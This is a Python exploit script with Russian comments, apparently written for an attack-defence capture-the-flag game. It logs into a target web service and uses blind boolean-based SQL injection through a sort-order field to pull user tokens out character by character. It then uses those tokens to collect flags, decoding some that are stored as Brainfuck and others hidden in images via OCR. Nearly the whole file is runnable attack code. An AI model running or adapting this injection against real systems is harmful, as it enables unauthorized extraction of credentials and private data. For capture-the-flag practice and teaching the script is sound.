#!/usr/bin/env python3

# Вторая уязвимость - BLind SQL Injection. Здесь также используется возможность поиска по пустой строке
# необходимо зарегестрировать пользователя wee с паролем wee, а также пользователей ttest2 (сначала) и ttest1 (позже)
import requests
from requests.auth import HTTPBasicAuth
import json
import time
import easyocr
import re
import sys
 
import bfParser

ip = sys.argv[1]
ALPHABET = "0123456789abcdefx"

def test(csrf, condition):
    data = {
        "search": "ium",
        "order": f"CASE WHEN {condition} THEN atomic_number ELSE name END"
    }
    
    order = "CASE WHEN {} THEN date_created ELSE username END".format(condition)
    p = s.post('http://{}:5000/search'.format(ip), data = 'csrf_token={}&order={}&search=ttest'.format(csrf, order).encode('UTF-8'), headers = headers)
    users = re.findall('class="profile-link">(ttest\d)<\/a>', p.text)

    return users[0] == 'ttest2'

with requests.Session() as s:
    p = s.get('http://{}:5000/login'.format(ip))
    csrf = re.findall('name="csrf_token" type="hidden" value="(.*)"', p.text)
    headers = {'Content-type': 'application/x-www-form-urlencoded'}
    p = s.post('http://{}:5000/login?next=%2Fhome'.format(ip), data = 'csrf_token={}&username=wee&password=wee&submit=Sign+In'.format(csrf[0]).encode('UTF-8'), headers = headers)
    
    p = s.post('http://{}:5000/search'.format(ip), data = 'csrf_token={}&order=date_created&search='.format(csrf[0]).encode('UTF-8'), headers = headers)
    users = re.findall('<form action="/follow/(.*)" method="post">', p.text)

    for user in users:
        tokenLen = 0
        for num in range(1, 120):
            # users[0] == ttest1 <-> false
            # users[0] == ttest2 <-> true
            res = test( csrf[0], f"(SELECT length(token) from user where username = '{user}' ) = {num}")
            if res:
                tokenLen = num
                break
        i = 1
        token = ""
        while i <= tokenLen:  # For all indexes
            for c in ALPHABET:  # For all characters
                if test(csrf[0], f"(SELECT substr(token,{i},1) FROM user where username = '{user}') = '{c}'"):
                    # Found true condition
                    token += c
                    break
            else:  # If no character was found, stop
                break
            i += 1
        print(token)
        req = 'csrf_token={}&token={}'.format(csrf[0], token)
        p = s.post('http://{}:5000/follow/{}'.format(ip, user), data = req.encode('UTF-8'), headers = headers)
        posts = re.findall('TEAM\d{3}_[A-Z0-9]{32}', p.text)
        print(posts) # Получили все флаги, хранящиеся в открытом виде
        
        posts = re.findall('">([\-\[\&gt;+l\]\.]+)<[\/]', p.text)
        for bf in posts:
            bf = bf.replace("&gt;",">")
            bf = bf.replace("&lt;","<")
            res = bfParser.evaluate(bf)
            print(res) # Получили флаги, хранящиеся в виде брейнфак кода

        
        images = re.findall('src=" /image/(.*).png"', p.text)
        for image in images:
            p = s.get('http://{}:5000/image/{}.png'.format(ip, image))
            if p.status_code == 200:
                with open("321.png", 'wb') as f:
                    f.write(p.content)
            reader = easyocr.Reader(['en'])
            result = reader.readtext('321.png', detail = 0)
            result = ' '.join(result)
            nums = re.findall(r'\d\d', result)
            flag2 = ''.join((chr(int(c))) for c in nums)
            print(flag2) # Получили флаги из картинок